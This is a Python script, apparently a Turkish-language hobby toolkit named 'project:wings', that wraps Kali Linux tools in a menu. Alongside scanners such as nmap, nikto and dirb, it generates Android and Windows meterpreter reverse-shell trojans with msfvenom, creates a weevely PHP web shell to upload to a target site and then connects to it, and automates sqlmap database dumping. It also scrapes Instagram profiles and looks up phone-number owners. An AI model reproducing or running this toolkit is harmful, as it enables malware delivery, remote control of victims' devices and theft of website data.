#!/usr/bin/env python

# -*- coding: utf-8 -*-




		##################################################
		#		  project:wings			 #
		#		 Automatized Kali		 #
		#		   Linux Tools			 #
		#	       github.com/oxydes-cyber		 #
		#        !!!DONT COPY WITHOUT PERMISSIONS!!!	 #
		#		  Author: oxydes		 #
		#	   contact: instagram.com/oxydes7	 #	
		#	    https://allmylinks.com/oxydes	 #
		#	       DEVELOPMENT IN PROGRESS		 #
		##################################################



import os 

import colorama
	
import time
	
import sys

import phonenumbers

import wikipedia

import requests

import selenium

import json

import instagram_explore

from phonenumbers import geocoder,carrier

try:
	
	


	def banner():
		print("""
		##################################################
		#		  project:wings			#
		#		 Automatized Kali		#
		#		   Linux Tools			#
		#	       github.com/oxydes-cyber		#
		#        !!!DONT COPY WITHOUT PERMISSIONS!!!	#
		#		  Author: oxydes		#
		#	   contact: instagram.com/oxydes7	#	
		#	    https://allmylinks.com/oxydes	#
		#	       DEVELOPMENT IN PROGRESS		#
		##################################################

		""")



	
	def banner_two():
		from colorama import Fore,Style
		os.system("clear")		
		print(Fore.RED + """
									
						       /$$                              
						      |__/                              
					 /$$  /$$  /$$ /$$ /$$$$$$$   /$$$$$$   /$$$$$$$
					| $$ | $$ | $$| $$| $$__  $$ /$$__  $$ /$$_____/
					| $$ | $$ | $$| $$| $$  \ $$| $$  \ $$|  $$$$$$ 
					| $$ | $$ | $$| $$| $$  | $$| $$  | $$ \____  $$
					|  $$$$$/$$$$/| $$| $$  | $$|  $$$$$$$ /$$$$$$$/
					 \_____/\___/ |__/|__/  |__/ \____  $$|_______/ 
								     /$$  \ $$          
								    |  $$$$$$/          
								     \______/           
								
				O7	O7	O7	O7	O7	O7	O7	O7	O7	O7
				O7	O7	O7	O7	O7	O7	O7	O7	O7	O7
				O7	O7	O7	O7	O7	O7	O7	O7	O7	O7
							
		""")
		print(Fore.BLUE)
	banner_two()
	time.sleep(5)	
	os.system("clear")
	banner()


	def netdiscover():
		os.system("clear")	
		os.system("figlet NETDISCOVER")
		print("Netdiscovera Hoşgeldiniz :)")
		time.sleep(7)
		os.system("netdiscover")
	
	def nikto():
		os.system("clear")
		os.system("figlet Nikto Scanner")
		print("Nikto Web Açık Tarayıcısına Hoşgeldiniz:)")
		time.sleep(3)
		ip = input("Hedef Ip Adresini Veya Host Adresini Gir : ")
		os.system("nikto -h " + ip + " -e 3")
	
	
	
	def trojan():
	
		os.system("clear")
		os.system("figlet MSFVENOM")
		print("Trojan Oluşturucuya Hoşgeldiniz:)")
		print("""
		Payloadlar ;
	
		1)Telefonlar İçin
		2)Windows İçin
	
		
	
	
		""")
	
		secim = int(input("Seçiminizi Yapın : "))
		lhost = input("IP Adresinizi Girin : ")
		lport = input("Portu Girin (443) : ")
		if secim == 1:
			os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw -e generic/none -i 1 -o /root/Masaüstü/trojen.apk")
			print("Trojan /root/Masaüstü/trojen.apk Yoluna Oluşturuldu.")
		
		if secim == 2:
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -e generic/none -i 1 -o /root/Masaüstü/trojen.exe")	
			print("Trojan /root/Masaüstü/trojen.exe Yoluna Oluşturuldu.")
	def rootkit():
		os.system("clear")
		os.system("figlet ROOTKIT SCANNER")
		soru = input("Rootkit Taraması Yapmak İster Misiniz ? (e/h) : ")
		if soru == "e":
			os.system("chkrootkit")
		elif soru == "h":
			print("Pekala :)")
	def weevely():
		

		os.system("clear")
		
		os.system("figlet WEB SHELL")
	
	
		while True:
			
		
			soru = input("Shell Dosyası Üretilsin Mi? (e/h) (çıkmak için q) : ")
			
			if soru == "e":
				sifre = input("Dosyaya Erişmek İçin Bir Şifre Girin : ")
				print("Dosya Üretiliyor...")
				time.sleep(2)
				os.system("weevely generate " + sifre + " /root/Masaüstü/php_dosyasi.php")
				print("Dosya /root/Masaüstü/php_dosyasi.php Yoluna Oluşturuldu...")
				secim = input("Dosya Dinlemeye Alınsın Mı (lütfen dosyayı siteye yükledikten sonra burayı cevaplayın(e/h çıkmak için q)) : ")
				if secim == "e":
					url = input("Dosyayı Yüklediğiniz Adresi Girin : ")
					print("3 Saniye Sonra Bağlantı Kurulmaya Çalışılacak...")
					time.sleep(3)
					os.system("weevely " + url + " " + sifre)
				elif secim == "h":
					print("Uygulamadan Çıkılıyor...")
					False
				elif secim =="q":
					sys.exit()
			elif soru == "h":
				print("Uygulamadan Çıkılıyor...")
				False
			elif soru == "q":
				sys.exit()
	def skipfish():

		os.system("clear")
		
		os.system("figlet SKIPFISH")

		print("LÜTFEN URLYI https://site.com/ OLARAK GİRİN")

		print("Skipfish Sistemlerde Açık Tarayan İleri Düzey Bir Uygulamadır.")

		while True:
			secim = input("Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : ")
			if secim == "e":
				url = input("Hedef Site Url Adresi Girin : ")
				print("3 Saniye Sonra Tarama Başlatılacak...")
				time.sleep(3)	
				os.system("skipfish -o /root/Masaüstü/sonuclar " + url)
				print("Sonuçlar /root/Masaüstü/sonuclar/index.html Yoluna Kaydedildi")
			

			elif secim == "h":
				print("Pekala:)")
				False
			elif secim == "q":
				print("Görüşmek Üzere :)")
				sys.exit()
			else:
				print("Beklenmeyen Hata:(")


	def nmap():
		os.system("clear")
		os.system("figlet NMAP")
		print("Port Scannera Hoşgeldiniz Nmap Kullanılarak Yapılmıştır...")
		while True:	
			soru = input("Devam Etmek İster Misiniz? (e/h) : ")
			if soru == "e":
						
				print("""
				1)Hızlı Tarama
				2)Firewall Taraması
				3)İşletim Sistemi Taraması
				4)SYN Taraması
				5)Versiyon Taraması
				6)SYN + Versiyon
				7)Hepsi Bir Arada Tarama
				""")
				secim = int(input("Seçiminizi Girin : "))
				ip = input("Hedef Host Veya Ip Adresi : ")
				if secim == 1:
					os.system("nmap " + ip)
				elif secim == 2:
					os.system("nmap -sA --script=http-waf-detect " + ip)
				elif secim == 3:
					os.system("nmap -O " + ip)
				elif secim == 4:
					os.system("nmap -sS " + ip)
				elif secim == 5:
					os.system("nmap -sV " + ip)
				elif secim == 6:
					os.system("nmap -sS -sV " + ip)
				elif secim == 7:
					os.system("nmap -A -O -sS -sV -sC" + ip)
							
				else:
					print("Hatalı Giriş")

			elif soru == "h":
				print("Görüşürüz :)")
				sys.exit()
	def sqlmap():
		

		os.system("figlet SQLMAP")
			

		print("Uygulama 3 Saniye Sonra Başlatılacak...")
		time.sleep(3)
		while True:
			soru = input("SQLMAP Başlatıldı Devam Etmek İstiyor Musunuz? (e/h çıkmak için q) : ")
			if soru == "e":
				url = input("Açıklı Url'yi Girin : ")
				os.system("sqlmap -u " + url + " --dbs")
				sual = input("Databaseler Göründüyse e Tuşlayın(gözükmediyse açık yoktur...)")
				if sual == "e":
					database = input("Database Adını Girin : ")
					os.system("sqlmap -u " + url + " -D " + database + " --tables")
					tables = input("Table Adını Girin : ")
					os.system("sqlmap -u " + url + " -D " + database + " -T " + tables + " --columns")
					column = input("Column Adı Girin : ")
					os.system("sqlmap -u " + url + " -D " + database + " -T " + tables + " -C " + column + " --dump")
					print("İşlem Bitti Hoşçakal...")
					sys.exit()
			elif soru == "h":
				print("Peki:)")
				False
			elif soru == "q":
				print("Görüşürüz...")
				sys.exit()

	def osint_by_phone():
		from phonenumbers import geocoder,carrier 
		os.system("clear")
		os.system("figlet OSINT BY PHONE")
		print("Lütfen Telefon Numarasını +905********* gibi giriniz.")
		print("Telefon Numarasından Ülke ve GSM Şirketi Bul")
		while True:
			secimin = input("Devam Etmek İçin e Çıkmak İçin h Girin : ")	
			if secimin == "e":		
				phone_number = input("Telefon Numarası Giriniz : ")
				isleme_girecek = phonenumbers.parse(phone_number)
				print(geocoder.description_for_number(isleme_girecek, 'en'))
				print(carrier.name_for_number(isleme_girecek, 'en'))
			elif secimin == "h":
				print("Peki ;)")
				False
				break

	def dnsmap():
		os.system("clear")
		os.system("figlet dnsmap")
		print("dnsmap'e hoşgeldin.Hedef siteyi gir.Subdomainleri söylesin.")
		while True:
			secim = input("dnsmap'i seçtiniz.Devam etmek istiyor musunuz? e/h : ")
			if secim == "e":
				web = input("hedef siteyi gir : ")
				os.system("dnsmap " + web)
			elif secim == "h":
				print("yönlendiriliyorsunuz...")
				False
				break

	def dirb():
		os.system("clear")
		os.system("figlet DIRB")
		print("Dirb'e hoşgeldin.Hedef siteyi gir,Hedef sitedeki içeriklerin linklerine ulaş.")
		while True:
			secim = input("Dirb seçeneğini seçtiniz.Devam etmek istiyor musunuz? e/h : ")
			if secim == "e":
				print("ÖNEMLİ!!! : Web sitesini http://domain.com veya https://domain.com olarak girin,aksi takdirde çalışmayacaktır.")
				site = input("Web sitesini giriniz : ")
				os.system("dirb "+ site +" /usr/share/dirb/wordlists/big.txt")
			elif secim == "h":
				print("Görüşmek Üzere :)")
				False
				break

	def theHarvester():
		os.system("clear")
		os.system("figlet theHarvester")
		print("theHarvester'a hoşgeldin.Hedef siteyi gir theHarvester sana aktif,pasif bilgi toplasın.")
		while True:
			secim = input("theHarvester'ı seçtin.Devam etmek için e Çıkmak için h tuşuna bas : ")
			if secim == "e":
				domain = input("Hedef siteyi gir : ")
				sonuclar = input("Sonuçları kaydetmek için alan girin.(örneğin : /root/Masaüstü/sonuclar) : ")
				os.system("theHarvester -d "+ domain + " -b all -l 400 -v -s -n -f " + sonuclar)
				print("Sonuçlar " + sonuclar + " klasörüne kaydedildi.")
			elif secim == "h":
				print("Hoşçakal:')")
				False 
				break
	def dig():
		os.system("clear")
		os.system("figlet DIG")
		print("DIG'e hoşgeldin.Hedef sitenin domain kayıtlarını gösterir.")
		while True:
			ques = input("dig seçeneğini seçtin.Devam etmek istediğinden emin misin? e/h : ")
			if ques == "e":
				domain = input("Hedef siteyi gir : ")
				print("Sonuçlar yükleniyor...")
				time.sleep(3)
				os.system("dig +trace " + domain)
			elif ques == "h":
				False
				break

	def whois():
		os.system("clear")
		os.system("figlet WHOIS")
		while True:
			ques = input("whois'e hoşgeldin.devam etmek ister misin? e/h : ")
			if ques == "e":
				domain = input("domain gir : ")
				print("sonuçlar yükleniyor...")
				time.sleep(3)
				os.system("whois " + domain)
			elif ques == "h":
				False
				break
	def firewall_detect():
		os.system("clear")
		os.system("figlet wafw00f")
		while True:
			ques = input("Merhaba 'Web Aplikasyonu Güvenlik Duvarı Tarayıcısı :)''nı seçtin devam etmek istiyor musun? e/h : ")
			if ques == "e":
				www = input("Hedef Domain'i gir : ")
				time.sleep(2)
				os.system("wafw00f " + www)
			elif ques == "h":
				False 
				break
	def wiki():
		os.system("clear")
		os.system("figlet WIKIPEDIA")
		print("Bu uygulama terminal üzerinden wikipedia araması yapmaznızı sağlar.")

		while True:
			ques = input("\nDevam etmek istiyor musun? e/h : ")
			if ques == "e":
				search = input("Neyi aramak istersiniz? : ")
				result = wikipedia.summary(search)
				print(result)
			elif ques == "h":
				False 
				break
			else:
				print("Bir hatayla Karşılaşıldı...")
				sys.exit()
 

	def insta_explore():
		
		import instagram_explore as ie
		import json
		

		os.system("clear")
		os.system("figlet IG_EXPLORE")

		while True:
			print("Bu uygulama Instagram profillerinin verilerini çeker")		
			ques = input("\n'InstaExplore' seçtiniz,devam etmek istiyor musunuz? e/h : ")
			
			if ques == "e":		
				#kullanıcıyı bul			
				name = input("Hedefin kullanıcı adını girin : ")
				result = ie.user(name)
				
				parsed_data = json.dumps(result, indent = 4, sort_keys = True)
				
				#bilgileri göster
				print(parsed_data[15:400])
			
			
			elif ques == "h":
				secim = input("Emin Misiniz? e/h : ")
				
				if secim == "e":
					False 
					break
				elif secim == "h":
					True
			else:
				print("Bir Hatayla Karşılaşıldı...")
				False 
				break
				sys.exit()		
	
	
		



	


	print("""
	1)netdiscover
	2)nikto
	3)msfvenom(%100 fud değil)
	4)rootkit scanner
	5)weevely web shell
	6)skipfish 
	7)nmap
	8)sqlmap
	9)telefon osint
	10)dnsmap
	11)dirb
	12)theHarvester
	13)wafw00f
	14)dig
	15)wiki-search
	16)insta_explore
	99)çıkış
	""")
	secim = int(input("Seçiminizi Girin : "))
	
	if secim == 1:
		netdiscover()
	elif secim == 2:
		nikto()
	elif secim == 3:
		trojan()
	elif secim == 4:
		rootkit()
	elif secim == 5:
		weevely()
	elif secim == 6:
		skipfish()
	elif secim == 7:
		nmap()
	elif secim == 8:
		sqlmap()
	elif secim == 9:
		osint_by_phone()
	elif secim == 10:
		dnsmap()
	elif secim == 11:
		dirb()
	elif secim == 12:
		theHarvester()
	elif secim == 13:
		firewall_detect()
	elif secim == 14:
		dig()
	elif secim == 15:
		wiki()
	elif secim == 16:
		insta_explore()
	elif secim == 99:
		print("Görüşmek Üzere")
		sys.exit()
	else:
		print("Hatalı Giriş Yaptınız ...")
except KeyboardInterrupt:
	os.system("clear")
	print("\nHoşçakal:)")
	
